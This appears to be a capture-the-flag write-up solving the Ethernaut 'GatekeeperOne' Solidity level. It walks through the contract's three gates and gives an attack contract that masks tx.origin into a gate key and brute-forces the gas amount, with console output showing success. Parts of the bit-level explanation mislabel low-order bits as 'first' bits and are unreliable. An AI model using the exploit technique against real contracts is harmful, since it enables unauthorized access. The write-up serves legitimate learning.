# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

Challenge's message:

> Make it past the gatekeeper and register as an entrant to pass this level. - Remember what you've learned from the Telephone and Token levels. - You can learn more about the special function gasleft(), in Solidity's documentation (see [here](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) and [here](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)).

The **GatekeeperOne** contract implements a gatekeeping mechanism that restricts entry to a certain function based on three specific conditions. There is a public address entrant variable that stores the address of the entrant who successfully passes the gatekeeping conditions. Also, we have three modifiers implemented on the **enter()** function: 

### Modifiers

#### gateOne()

This modifier enforces a condition that the *msg.sender* (the caller of the function) is not the same as the *tx.origin* (the origin of the transaction). In other words, it ensures that the function is not called directly but is being called through another contract or function.

#### gateTwo()

This modifier checks if the remaining gas (`gasleft()`) divided by 8191 is equal to zero. It restricts the execution of the function based on the specific gas limit condition.

#### gateThree()

This modifier takes a parameter *_gateKey* of type *bytes8* and enforces three conditions:

- The first condition checks if the first 32 bits of *_gateKey* (converted to *uint64*) is equal to the first 16 bits of *_gateKey*. If they are not equal, it throws an error with the message "GatekeeperOne: invalid gateThree part one". ***This condition ensures that the first 16 bits of *_gateKey* are zero***.
- The second condition checks if the first 32 bits of *_gateKey* (converted to *uint64*) is not equal to *_gateKey* itself. If they are equal, it throws an error with the message "GatekeeperOne: invalid gateThree part two". ***This condition ensures that the first 32 bits of *_gateKey* are not all zeros***.
- The third condition checks if the first 32 bits of *_gateKey* (converted to *uint64*) is equal to the first 16 bits of the *tx.origin* (the origin of the transaction). If they are not equal, it throws an error with the message "GatekeeperOne: invalid gateThree part three". ***This condition ensures that the first 16 bits of *_gateKey* match the first 16 bits of the transaction origin address***.


In the enter() function is the entry point of the contract and is used to gain access based on the gatekeeping conditions. It takes a parameter *_gateKey* of type *bytes8* which is used in the gateThree modifier. The function first applies the *gateOne*, *gateTwo*, and *gateThree* modifiers to enforce the respective conditions. If all the conditions are met, the entrant variable is updated with the *tx.origin* (the origin of the transaction) and the function returns *true*.

It's important to note that the code does not provide any indication of what the gatekeeping conditions are meant to achieve or how they contribute to the functionality or security of the contract.


# Subverting

```solidity
pragma solidity ^0.8.17;

import './GatekeeperOne.sol';

contract Attack{

    GatekeeperOne target;

    constructor(address _target){
        target = GatekeeperOne(_target);
    }

    function attack() external{
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for(uint i=0; i<200; i++){
            uint totalGas = (8191*3) + i;
            (bool result, ) = address(target).call{gas: totalGas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if(result){
                break;
            }
        }
    }

}
```

call attack function. See in [etherscan](https://sepolia.etherscan.io/tx/0xb28373341fc7cf1eba3ac0c67320cef9928268da033ec62771d2386ff422b8d7).

```shell
await contract.entrant()
'0x0000000000000000000000000000000000000000'
```


```shell
await contract.entrant()
'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
```

```shell
player
'0x9C84d84b46971Faf8B480aB116b7f5391D630fA1'
```

Ethernaut's message:

> Well done! Next, try your hand with the second gatekeeper...


